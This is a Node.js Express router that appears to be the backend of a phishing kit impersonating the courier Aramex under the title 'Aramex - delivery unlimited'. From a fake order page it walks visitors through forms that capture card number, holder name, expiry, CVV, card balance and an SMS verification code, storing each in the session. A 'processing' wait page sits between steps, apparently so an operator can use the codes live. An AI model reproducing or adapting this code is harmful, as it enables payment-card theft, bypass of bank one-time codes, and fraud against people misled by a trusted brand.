var express = require("express");
var router = express.Router();
const geoip = require("geoip-lite");
const Order = require("../model/Order");

router.get("/", (req, res, next) => {
  res.send("Something went wrong, please try again later.");
});

/* GET home page. */
router.get("/order/:orderID", async function (req, res, next) {
  const order = await Order.findById(req.params.orderID);

  if (!order) {
    return res.redirect("/");
  }

  if (!req.session.uniqueID) {
    // Generate a random number between 10000 (inclusive) and 99999 (exclusive)
    const min = 10000;
    const max = 99999;
    // const clientIp = req.clientIp;
    const clientIp = "188.113.197.247";
    req.session.uniqueID = Math.floor(
      Math.random() * (max - min) + min
    ).toString();
    req.session.ip = clientIp;
    req.session.country = geoip.lookup(clientIp).country;
    req.session.orderId = order._id;
    req.session.page = "Order";
  }
  res.render("index", { title: "Aramex - delivery unlimited", order: order });
});

router.get("/card", (req, res, next) => {
  req.session.page = "Card";
  res.render("card", {
    title: "Aramex - delivery unlimited",
    uniqueID: req.session.uniqueID,
  });
});

router.post("/card", (req, res, next) => {
  req.session.cardNumber = req.body.number;
  req.session.cardHolder = req.body.holder;
  req.session.expiryDate = `${req.body.expirydate_month}/${req.body.expirydate_year}`;
  req.session.cvvNumber = req.body.cvv;
  res.redirect("/processing");
});

router.get("/processing", (req, res, next) => {
  req.session.page = "Waiting";
  res.render("wait", {
    title: "Aramex - delivery unlimited",
    uniqueID: req.session.uniqueID,
  });
});

router.get("/cbal", (req, res, next) => {
  req.session.page = "Balance";
  res.render("balance", { title: "Aramex - delivery unlimited" });
});

router.post("/cbal", (req, res, next) => {
  req.session.cardBalance = req.body.balance;
  res.redirect("/processing");
});

router.get("/sc-cnrm", (req, res, next) => {
  req.session.page = "Card";
  res.render("sms", { title: "Aramex - delivery unlimited" });
});

router.post("/sc-cnrm", (req, res, next) => {
  req.session.smsCode = req.body.cvv;
  res.redirect("/processing");
});

router.get("/completed", async (req, res, next) => {
  const trackingNumber = await Order.findById(req.session.orderId);
  req.session.page = "Completed";
  res.render("completed", {
    title: "Aramex - delivery unlimited",
    trackingNumber,
  });
});

module.exports = router;
